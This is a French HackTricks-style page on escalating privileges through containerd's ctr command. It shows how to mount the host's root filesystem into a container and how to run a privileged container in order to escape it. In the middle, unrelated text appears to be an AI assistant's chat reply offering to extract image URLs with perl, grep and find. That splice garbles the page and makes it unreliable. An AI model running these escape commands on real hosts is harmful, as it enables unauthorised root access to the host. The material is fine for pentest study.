# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basic information

Consultez le lien suivant pour savoir **où `containerd` et `ctr` s'intègrent dans la pile de conteneurs**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

si vous trouvez qu'un hôte contient la commande `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Je peux les lister. Fournissez soit le contenu du fichier, soit exécutez une des commandes suivantes dans le dépôt pour extraire les images référencées dans le markdown ou sur le disque.

Extraiter les URLs d'images référencées dans le fichier markdown :
```
# Perl : extrait les URL des images Markdown
perl -nle 'while(/!\[.*?\]\((.*?)\)/g){print $1}' src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md
```

Même chose avec grep/sed :
```
grep -oP '!\[.*?\]\(.*?\)' src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md | sed -E 's/!\[.*\]\((.*)\)/\1/'
```

Lister les fichiers images présents sous le dossier correspondant :
```
find src/linux-hardening/privilege-escalation/ -type f \( -iname '*.png' -o -iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.gif' -o -iname '*.svg' \) -print
```

Collez le contenu du fichier ici si vous voulez que je l’analyse et que j’en retire la liste pour vous.
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Et ensuite **lancez une de ces images en y montant le host root folder** :
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Exécuter un container privileged et en sortir.\
Vous pouvez exécuter un container privileged comme :
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Vous pouvez ensuite utiliser certaines des techniques mentionnées dans la page suivante pour **escape from it abusing privileged capabilities**:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
